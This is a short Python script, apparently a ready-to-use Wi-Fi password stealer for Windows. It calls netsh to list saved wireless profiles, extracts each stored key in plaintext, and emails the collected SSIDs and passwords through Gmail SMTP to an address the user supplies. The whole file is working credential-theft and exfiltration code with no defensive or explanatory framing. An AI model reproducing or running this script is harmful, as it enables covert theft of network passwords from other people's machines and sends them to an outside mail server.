import subprocess, re, smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profiles"

networks = str(subprocess.check_output(command, shell=True))

network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

lis = network_names_list[0].split("\\r\\n")

network_names = []
for i in lis:
    if ":" in i:
        index = i.index(":")
        network_names.append(i[index + 2 :])
    else:
        network_names.append(i)
result = ""
curr_result = ""
for i in network_names:
    command = "netsh wlan show profiles " + i + " key = clear"
    try:
        curr_result = subprocess.check_output(command, shell=True)
        result = result + str(curr_result)
    except:
        pass

result = result.split("\\r\\n")
content = ""
for i in result:
    if "SSID name" in i:
        content += i + " "
    if "Key Content" in i:
        content += i + "\n\n"
'''Enter your email and password in the function parameters'''
send_mail("<Enter your gmail>", "<Enter your gmail password>", content)

